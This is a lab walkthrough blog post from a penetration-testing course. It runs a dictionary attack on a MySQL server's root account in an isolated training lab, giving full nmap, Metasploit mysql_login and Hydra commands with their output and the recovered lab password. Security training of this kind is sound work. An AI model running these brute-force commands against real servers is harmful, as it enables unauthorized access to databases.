---
layout: post
title: "MySQL Dictionary Attack"
date: "2022-08-26"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Assessment Methodologies
    - Enumeration
---

# MySQL Dictionary Attack（MySQL Dictionary Attack）
```
ip a

eth1 192.99.154.2/24
```

```
nmap 192.99.154.3

PORT        STATE   SERVICE
3306/tcp    open    mysql
```

```
nmap 192.99.154.3 -p 3306 -sV

PORT        STATE   SERVICE VERSION
3306/tcp    open    mysql   MySQL 5.5.62-0ubuntu0.14.04.1
```

```
msfconsole

use auxiliary/scanner/mysql/mysql_login
set rhosts 192.99.154.3
set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set verbose false
set stop_on_success true
set username root
run
exit
```

```
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.99.154.3 mysql 
```

# MySQL Recon: Dictionary Attack（MySQL Recon：字典攻击）
## 概述
在这个挑战中，我们将研究对 MySQL 服务器的字典攻击。请开始实验并回答以下问题：

问题

1. 找到访问 MySQL 服务器所需的用户“root”的密码。使用合适的 metasploit 模块和密码字典：/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
2. 找到访问 MySQL 服务器所需的用户“root”的密码。使用 Hydra 和密码字典：/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

指示： 

* 这个实验室是献给你的！此网络上没有其他用户 :)
* 开始实验室后，您将可以访问 Kali 实例的根终端
* 你的 Kali 有一个 IP 地址为 192.XYZ 的接口运行“ip addr”来知道 X 和 Y 的值。
* 目标机器应位于 IP 地址 192.XY3。
* 不要攻击位于 IP 地址 192.XY1 的网关

## 我自己的思路

In this challenge we will look at the dictionary attacks on MySQL server. Please start the lab and answer the following questions:

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
31246: eth0@if31247: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.7/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
31249: eth1@if31250: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:8a:31:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.138.49.2/24 brd 192.138.49.255 scope global eth1
       valid_lft forever preferred_lft forever
```

```
root@attackdefense:~# nmap 192.138.49.3
Starting Nmap 7.70 ( https://nmap.org ) at 2022-08-26 12:12 UTC
Nmap scan report for target-1 (192.138.49.3)
Host is up (0.000010s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:C0:8A:31:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```

```
root@attackdefense:~# nmap 192.138.49.3 -p 3306 -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2022-08-26 12:14 UTC
Nmap scan report for target-1 (192.138.49.3)
Host is up (0.000044s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
MAC Address: 02:42:C0:8A:31:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
```

Questions

Find the password of user “root” which is required to access the MySQL server. Use suitable metasploit module with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

`root:catalina`

[MySQL Login Utility](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_login/)

这个模块简单地查询 MySQL 实例以获取特定的用户/密码（默认是 root 和空白）。

```
msf5 > use auxiliary/scanner/mysql/mysql_login
msf5 auxiliary(scanner/mysql/mysql_login) > show options

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             3306             yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.138.49.3
RHOSTS => 192.138.49.3
msf5 auxiliary(scanner/mysql/mysql_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf5 auxiliary(scanner/mysql/mysql_login) > set USERNAME root
USERNAME => root
msf5 auxiliary(scanner/mysql/mysql_login) > set VERBOSE false
VERBOSE => false
msf5 auxiliary(scanner/mysql/mysql_login) > run

[+] 192.138.49.3:3306     - 192.138.49.3:3306 - Success: 'root:catalina'
[*] 192.138.49.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Find the password of user “root” which is required to access the MySQL server. Use Hydra with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

`root:catalina`


```
root@attackdefense:~# hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.138.49.3 mysql
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-26 12:29:08
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task
[DATA] attacking mysql://192.138.49.3:3306/
[3306][mysql] host: 192.138.49.3   login: root   password: catalina
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-26 12:30:02
```

## 解决方案
此实验室的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-532.pdf

[mysql](https://www.mysql.com/)

[MySQL Login Utility](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_login/)

[hydra](https://www.kali.org/tools/hydra/)